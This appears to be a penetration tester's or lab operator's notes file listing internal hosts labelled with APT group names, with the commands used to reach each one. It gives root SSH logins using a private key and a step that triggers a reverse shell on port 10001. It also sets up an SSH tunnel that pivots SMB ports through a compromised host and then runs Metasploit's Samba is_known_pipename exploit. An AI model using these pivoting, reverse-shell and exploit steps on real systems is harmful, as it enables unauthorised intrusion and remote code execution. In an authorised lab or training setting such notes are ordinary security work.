# Accesses

## 10.128.161.27

- `energetic-bear`
- Cuiteur

```bash
ssh -i /home/apultyn/.ssh/id_ed25519 root@10.128.161.27
```

## 10.128.161.40

- `Lazarus`
- listen on port 10001
- go to <http://10.128.161.40:8282/reverse-10001/>

## 10.128.161.41

- `sea-turtle`

```bash
ssh -i /home/apultyn/.ssh/id_ed25519 root@10.128.161.41
```

## 10.128.161.46 

- `buckeye`

```bash
ssh -i id_ed25519 root@10.128.161.46 -p 52961
```

## 10.128.162.9

- other network
- first tunnel:

```bash
ssh -N \
    -R 4444:127.0.0.1:4444 \
    -L 139:10.128.162.9:139 \
    -L 445:10.128.162.9:445 \
    -i /home/apultyn/.ssh/id_ed25519 \
    -p 52961 \
    root@10.128.161.46
```

- then in metasploit:

```bash
use exploit/linux/samba/is_known_pipename
set RHOSTS 127.0.0.1
set SMB_SHARE_NAME tony
set SMB_FOLDER /home/tony
exploit
```